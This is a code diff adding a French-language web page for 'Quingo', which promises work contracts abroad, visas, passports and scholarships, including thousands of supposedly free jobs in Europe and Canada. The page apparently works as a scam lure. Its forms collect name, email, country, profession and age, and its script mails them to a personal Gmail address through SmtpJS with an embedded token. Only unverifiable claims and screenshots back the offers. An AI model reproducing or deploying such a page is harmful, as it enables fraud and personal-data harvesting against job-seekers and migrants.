@@ -1,0 +1,549 @@
+<!doctype html>
+<html lang="fr"> 
+ <head> 
+  <meta charset="UTF-8">
+  <title>Prestamos/Kredit</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script> 
+  <script src="https://smtpjs.com/v3/smtp.js"></script> 
+ <style type="text/css" id="dcoder_stylesheet">@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
+*{
+    margin:0;
+    padding:0;
+}
+body{
+    background-color: ;
+    font-family: "Poppins", sans-serif;
+ 
+}
+
+.menu{
+    display:none;
+    background-color: lightgrey;
+    padding: 10px;
+    animation: fadeIn 1s;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 1;
+    }
+}
+
+.close{
+    float: right;
+    cursor: pointer;
+    margin-left:20%;
+}
+span{
+    margin-left:93%;
+    margin-top:2%;
+    font-size:20px;
+}
+at{
+ font-family: "Archivo Black", sans-serif;   
+}
+ad{
+ font-family: "Poppins", sans-serif; 
+    
+}
+a{
+    color:black;
+    text-decoration:none
+    
+}
+.zmg{
+    margin-top:%;
+    position: 
+    text-align:center;
+    background-color:whi;
+    border-top:0.5px solid #777;
+}
+.zmg img{
+    width:120px;
+    display:;
+    
+}
+ .gmg img{
+    width:30px;
+    cursor:pointer;
+    margin-left:3%;
+}
+.amg img{
+  width:353px;
+}
+.bmg img{
+    width:300px;
+    margin-top:-65%;
+    margin-left:6%;
+}
+.drapeau{
+    margin-top:-30%;
+}
+.drapeau img{
+  width:30px;
+  margin-left:4%;
+  
+   } 
+ .cmg img{
+    width:355px;   
+    margin-top:15%;
+   }
+   .dmg img{
+       width:353px; 
+       margin-top:  
+   }
+   .txt1{
+       margin-top:5%;
+       font-family: "Archivo Black", sans-serif;
+       margin-left:3%;
+   }
+.txt2{
+    
+    margin-left:3%;
+    margin-right:3%;
+    justify-content:center;
+}
+#submit1{
+    border-radius:10px;
+    margin-left:10%;
+    margin-right:10%;
+    width:;
+    height:430px;
+    border: 2px solid rgb(110,39,35);
+    text-align:center;
+    font-family: "Poppins", sans-serif;
+ 
+}
+input{
+    font-size:16px;
+    Outline:none;
+    border-radius:3px;
+    margin-top:5%;
+    width:84%;
+    height:30px;
+    border:1px solid rgb(110,39,35);
+color: black;
+
+}
+input[type="submit"]{
+    border-radius:3px;
+    border:none;
+    Outline:none;
+    color:white;
+    background-color:rgb(110,39,35);
+    width:85%;
+    height:35px;
+    margin-top:5%;
+}
+select {
+        margin-top:7%;
+ width:85%;
+ height:35px;
+  font-size: 16px;
+  border-radius: 5px;
+  border:1px solid rgb(110,39,35);
+      Outline:none;
+      background-color:white;
+}
+h4{
+    margin-top:2%;
+    margin-left:10%;
+}
+
+
+.txt4{
+    color:white;
+}
+ @keyframes clignoter {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+    .but {
+            width:55%;
+    height:40px;
+    border-radius:13px;
+    margin-top:10%;
+    margin-left:20%;
+    
+            animation: clignoter 1.5s infinite; /* 1s pour la vitesse et infinite pour que ça continue */
+            display: inline-block; /* Pour un meilleur rendu */
+            padding: 10px; 
+            background-color:#54af51;
+        }
+    .insc{
+        display:none;
+        position:fixed;
+        margin-top:-285%;
+        background-color:white;
+        width:100%;
+        height:680px;
+    }
+    .insc input{
+        width:70%;
+        margin-left:15%;
+    }
+   textarea{
+       margin-top:2%;
+        width:70%;
+        height:100px;
+        margin-left:15%;
+        Outline:none;
+        
+    }
+    .alert1{
+  position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:100%;
+       height:680px;
+       margin-left:%;
+       margin-top:-285%;
+       background-color: white;
+       text-align:center;
+       border-radius:5px;  
+} 
+.alert1 img{
+          width:100px;
+          margin-top:50%;
+          
+      } 
+      .close02{
+    margin-top:-80%;
+    margin-left:90%;
+    position :absolute;
+    font-size:25px;
+}
+
+    .alert2{
+  position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:100%;
+       height:720px;
+       margin-left:%;
+       margin-top:-300%;
+       background-color: white;
+       text-align:center;
+       border-radius:5px;  
+} 
+.alert2 img{
+          width:100px;
+          margin-top:50%;
+          
+      } 
+      .close03{
+    margin-top:-62%;
+    margin-left:90%;
+    position :absolute;
+    font-size:20px;
+}
+.titre {
+  font-family: "Archivo Black", sans-serif;  
+  font-size:10px;
+  margin-top:-14%;
+  margin-left:13%;
+}
+.lmg{
+    margin-top:2%;
+}
+.lmg img{
+    width:40px;
+    margin-left:1.5%;
+}
+.txt5{
+    font-size:9px;
+    color:#777;
+    margin-left:13%;
+    margin-right:%;
+    margin-top:%;
+}
+.txt6{
+  font-family: "Archivo Black", sans-serif;  
+  margin-left:3%; 
+}
+.txt7{
+    font-size:12px;
+    margin-left:3.5%;
+    margin-right:1.2%;
+}
+#submit2 select{
+    width:70%;
+    margin-left:15%;
+}
+.emg{
+    margin-top:-32%;
+    margin-left:93%;
+}
+.emg img{
+    width:50px;
+}
+.txt4{
+    font-family: "Archivo Black", sans-serif;
+    margin-top:5%;
+}
+.txt8{
+  font-size:13px;
+  margin-left:2%;
+  margin-right:2%; 
+}
+
+</style>
+<body>
+<div class="gmg"><img src="https://i.postimg.cc/9Q7v1jJr/1200px-Hamburger-icon-svg.png"></div>
+<div class="menu">
+    <span class="close">X</span>
+    <at>Menu</at><br>
+    <a href="mailto:fr.contact.me@gmail.com"><ad>Annulé une demande</ad></a><br>
+    <a href="mailto:fr.contact.me@gmail.com"><ad>Voir l'évolution de mon dossier</ad></a><br>
+    <a href="mailto:fr.contact.me@gmail.com "><ad>Nous contacter</ad></a><br>
+    <a href="mailto:fr.contact.me@gmail.com"><ad>Signalé un problème</ad></a><br>
+    <a href="mailto:fr.contact.me@gmail.com"><ad>Devenir sponsor</ad><br>
+</div></a>
+
+ 
+<div class="amg">
+<img src="https://i.postimg.cc/44V98qcq/gif-avion.gif">
+</div>
+<div class="bmg">
+<img src="https://i.postimg.cc/G3Kchjn9/logo9-24-20277.png">
+</div>
+
+<div class="drapeau">
+<img src="https://i.postimg.cc/SxNYxKPb/03-56-00-644-512.gif">
+<img src="https://i.postimg.cc/d1dLxZhr/17-55-51-8-512.gif">
+<img src="https://i.postimg.cc/gcVxyRFP/20-19-38-788-512.gif">
+<img src="https://i.postimg.cc/QNJMK318/03-09-29-548-512.gif">
+<img src="https://i.postimg.cc/MHK5Hh2D/03-40-50-274-512.gif">
+<img src="https://i.postimg.cc/RZQdBcY9/17-55-34-595-512.gif">
+<img src="https://i.postimg.cc/cCWx3GdV/04-34-30-643-512.gif">
+</div>
+
+<div class="txt1">Bienvenu sur QUINGO !</div>
+
+<div class="txt2">Avec Quingo vous pouvez demander et obtenir facilement et rapidement un contrat de travail à l'étranger, une bourse d'étude, un visa touristique, un visa de résidence, un passeport et plus encore. Remplissez juste le formulaire et nous prendrons contact avec vous pour vous satisfaire.
+</div>
+<h4>Remplissez le formulaire</h4>
+<form id="submit1">
+<div class="input">
+
+<select>
+  <option value="option1">Type de demande</option>
+  <option value="option3">Contrat de travail</option>
+  <option value="option3">Passeport</option>
+  
+  <option value="option2">Visa touristique</option>
+  <option value="option3">Visa</option>
+  <option value="option3">Bourse d'étude</option>
+  
+  </select><br>
+   <input type="emai" id="aname" placeholder="Nom et prénom" required><br> 
+   <input type="emai" id="bname" placeholder="Email valide" required>
+<br>
+<input type="emai" id="cname" placeholder="Pays de résidence" required>
+<select>
+<option value="option1">Sex</option>
+  <option value="option2">Male</option>
+  <option value="option3">Female</option>
+</select><br>
+
+<input type="emai" id="dname" placeholder="Profession" required><br> 
+
+<input type="emai" id="ename" placeholder="Âge" required><br>
+<input type="submit" id="submit">
+</div>
+</form>
+
+<div class="but">
+<div class="txt4">Nouvelle offre gratuite</div>
+<div class="emg">
+<img src="https://i.postimg.cc/Kzz3132r/214305.png">
+</div>
+</div>
+<div class="insc">
+<span class="close1">X</span><br>
+<div class="txt6">Du WOW !!!</div>
+<div class="txt7">Obtenez gratuitement un contrat de travail dans les pays suivants : France, Espagne, Allemagne, Canada, Suisse et  Belgique.<br> Dans les domaines suivants:<br></div>
+<div class="info">
+<div class="lmg"><img src="https://i.postimg.cc/rp216xhs/1830767.png"></div>
+<div class="titre">Cuisine</div>
+<div class="txt5">Plus de 800 places disponibles dans ce domaine dans les pays suivants : France, Canada, Allemagne, Espagne, Belgique, Suisse.</div></div>
+<div class="info">
+<div class="lmg"><img src="https://i.postimg.cc/DyWL8BHm/4692642.png"></div>
+<div class="titre">Nettoyage</div>
+<div class="txt5">Plus de 5000 places  disponibles dans ce domaine dans les pays suivants : France, Canada, Allemagne, Espagne, Belgique, Suisse.</div>
+
+<div class="info">
+<div class="lmg"><img src="https://i.postimg.cc/26cL5Zx4/421858.png"></div>
+<div class="titre">Restaurant</div>
+<div class="txt5">Plus de 700 places disponibles dans ce domaine dans les pays suivants : France, Canada, Allemagne, Espagne, Belgique, Suisse.</div></div>
+<div class="info">
+<div class="lmg"><img src="https://i.postimg.cc/3rzVybNc/2087.png"></div>
+<div class="titre">Conducteur</div>
+<div class="txt5">Plus de 400 places disponibles dans ce domaine dans les pays suivants : France, Canada, Allemagne, Espagne, Belgique, Suisse.</div></div>
+</div>
+<form id="submit2"> 
+<select id="fname">
+  <option value="option1">Pays</option>
+  <option value="option3">France</option>
+  <option value="option3">Allemagne</option>
+  
+  <option value="option2">Canada</option>
+  <option value="option3">Espagne</option>
+  <option value="option3">Suisse</option>
+    <option value="option3">Belgique</option>
+  
+  </select><br>
+<input type="emai" id="gname" placeholder="Votre email" required><br> 
+<textarea id="hname" placeholder="Présentez-vous et dîtes nous le domaine qui vous convient." required></textarea><br>
+<input type="submit" id="submit"> 
+</form>
+ </div>
+
+<div class="alert1" style="display: noe;">
+            <div class="kmg"><img src="https://i.postimg.cc/2jxWdkC0/11289688.png"></div>
+            <div class="close02">X</div>
+            <div class="txt8">Votre demande a été envoyé avec succès, nous vous contacterons pour la suite d'ici 24h. Merci de patienter.</div>
+        </div>
+    </div>
+    
+    <div class="alert2" style="display: noe;">
+            <div class="kmg"><img src="https://i.postimg.cc/2jxWdkC0/11289688.png"></div>
+            <div class="close03">X</div>
+            <div class="txt8">Votre demande a été envoyé avec succès, nous vous contacterons pour la suite d'ici 24h. Merci de patienter.</div>
+        </div>
+    </div>
+ 
+ 
+
+<div class="cmg">
+<img src="https://i.postimg.cc/9fZQkGYh/Screenshot-20240118-132702-1.jpg">
+</div>
+<div class="cmg">
+<img src="https://i.postimg.cc/wTMTzKQF/Screenshot-20240118-132722-1.jpg">
+</div>
+<div class="dmg">
+<img src="https://i.postimg.cc/52wcdpTn/Screenshot-20240118-132738-1.jpg">
+</div>
+
+</body>
+<script>
+
+document.querySelector('.gmg').addEventListener('click', function(){
+    document.querySelector('.menu').style.display = 'block';
+});
+
+document.querySelector('.close').addEventListener('click', function(){
+    document.querySelector('.menu').style.display = 'none';
+});
+
+
+
+document.querySelector('.but').addEventListener('click', function(){
+    document.querySelector('.insc').style.display = 'block';
+});
+
+document.querySelector('.close1').addEventListener('click', function(){
+    document.querySelector('.insc').style.display = 'none';
+});
+
+
+document.getElementById('submit1').addEventListener('submit', (e) => {
+    e.preventDefault();
+    setTimeout(() => {
+     
+     const aname = document.getElementById('aname');
+      const bname = document.getElementById('bname');
+      const cname = document.getElementById('cname');
+      const dname = document.getElementById('dname');
+      const ename = document.getElementById('ename');
+            
+
+      const ebody3 = `
+        <h1>Nom: </h1>${aname.value}
+        <br>
+        <h1>email: </h1>${bname.value}
+        <br>
+        <h1>Pays: </h1>${cname.value}
+        <br>
+        <h1>Profession: </h1>${dname.value}
+        <br>
+        <h1>Âge: </h1>${ename.value}
+        <br>
+      `;
+
+      Email.send({
+        SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb",
+        To: 'abdoulissa154@gmail.com',
+        From: "abdoulissa154@gmail.com",
+        Subject: "This is the subject",
+        Body: ebody3
+      }).then(() => {
+        setTimeout(() => {
+          document.querySelector(".alert1").style.display = "block";
+        }, 500);
+      });
+      
+      window.location.href = "#";
+    }, 500);
+  });
+  
+  document.getElementById('submit2').addEventListener('submit', (e) => {
+    e.preventDefault();
+    setTimeout(() => {
+     
+     const fname = document.getElementById('fname');
+      const gname = document.getElementById('gname');
+      const hname = document.getElementById('hname');
+      
+            
+
+      const ebody3 = `
+        <h1>Nom: </h1>${fname.value}
+        <br>
+        <h1>email: </h1>${hname.value}
+        <br>
+        <h1>info: </h1>${gname.value}
+        <br>
+     
+      `;
+
+      Email.send({
+        SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb",
+        To: 'abdoulissa154@gmail.com',
+        From: "abdoulissa154@gmail.com",
+        Subject: "This is the subject",
+        Body: ebody3
+      }).then(() => {
+        setTimeout(() => {
+          document.querySelector(".alert1").style.display = "block";
+        }, 500);
+      });
+      
+      window.location.href = "#";
+    }, 500);
+  });
+  
+const close02alert1 = document.querySelector('.alert1 .close02');
+const alert1 = document.querySelector('.alert1');
+
+close02alert1.addEventListener('click', function() {
+    alert1.style.display = 'none';
+});
+
+const close03alert2 = document.querySelector('.alert2 .close03');
+const alert2 = document.querySelector('.alert2');
+
+close03alert2.addEventListener('click', function() {
+    alert2.style.display = 'none';
+});  
+
+
+</script></html>|
